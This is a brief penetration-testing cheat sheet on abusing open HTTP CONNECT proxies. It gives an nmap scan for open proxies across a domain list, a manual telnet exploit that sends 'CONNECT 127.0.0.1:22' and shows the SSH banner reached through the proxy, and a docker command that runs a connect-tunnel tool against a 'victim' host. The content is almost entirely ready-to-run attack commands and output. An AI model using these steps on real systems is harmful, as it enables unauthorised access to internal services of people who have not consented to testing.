
# Find such issues

nmap --script http-open-proxy -p80,443,8080 -iL /tmp/domains.txt


# Exploit it manually

telnet <vulnerable ip> 8080
CONNECT 127.0.0.1:22 HTTP/1.1

HTTP/1.1 200 Connection established
Proxy-agent: Proxy+ 2.50
SSH-2.2-OpenSSH_5.1p1 Debian-8

# Exploit automatically

docker build -t whitespots/connect-tunnel .
docker run -it --rm --name connect-tunnel whitespots/connect-tunnel -P victim:8080 -T hostport:target:port -v

(Read more about this tool)[http://manpages.ubuntu.com/manpages/bionic/man1/connect-tunnel.1p.html]
